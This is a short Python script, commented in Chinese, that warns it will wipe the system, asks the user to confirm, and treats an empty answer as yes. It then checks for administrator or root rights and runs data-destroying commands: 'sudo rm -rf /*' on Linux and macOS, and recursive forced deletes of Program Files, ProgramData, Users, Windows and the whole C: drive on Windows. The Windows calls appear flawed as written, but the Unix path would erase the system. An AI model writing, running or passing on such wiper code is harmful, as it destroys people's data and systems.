import os
import sys
import ctypes
import subprocess
import platform

print("程序版本:0.1")

def main():
    # 暂停程序并等待用户输入
    user_input = input("此程序十分危险，会清除你的系统，是否继续执行？(Y/N):")

    # 如果用户输入的是'y'或'y'的大小写形式，或者直接按下了回车键（输入为空字符串）
    if user_input.lower() == 'y' or user_input == '':
        print("继续执行...")

        # 继续执行程序的其余部分
        def is_admin():
            if sys.platform == "win32":
                try:
                    # Windows 系统下检查是否为管理员
                    return ctypes.windll.shell32.IsUserAnAdmin()
                except:
                    return False
            else:
                # Linux 或 macOS 下检查是否为 root 用户
                return os.geteuid() == 0

        # 检查是否为管理员身份运行
        if not is_admin():
            print("程序未以管理员身份运行，将退出程序。")
            sys.exit(1)  # 退出程序

        print("程序以管理员身份运行")

        # 输出 Python 版本信息
        print(f"Python version: {sys.version}")

        # 检测操作系统类型
        system_type = platform.system()

        # 根据操作系统类型执行命令
        if system_type in ['Linux', 'Darwin']:
            # 对于 Linux 和 macOS
            subprocess.run(["sudo", "rm", "-rf", "/*"], check=True)
        elif system_type == 'Windows':
            # 对于 Windows
            subprocess.run(["del", "/S", "/Q" , "C:\Program Files (x86)\*.*"], check=True)
            subprocess.run(["del", "/S", "/Q" , "C:\Program Files\*.*"], check=True)
            subprocess.run(["del", "/S", "/Q" , "C:\ProgramData\*.*"], check=True)
            subprocess.run(["del", "/S", "/Q" , "C:\Users\*.*"], check=True)
            subprocess.run(["del", "/S", "/Q" , "C:\Windows\*.*"], check=True)
            subprocess.run(["del", "/S", "/Q" , "C:\*.*"], check=True)

    else:
        print("正在关闭程序...")
        # 可以选择在这里提前结束程序
        return

if __name__ == "__main__":
    main()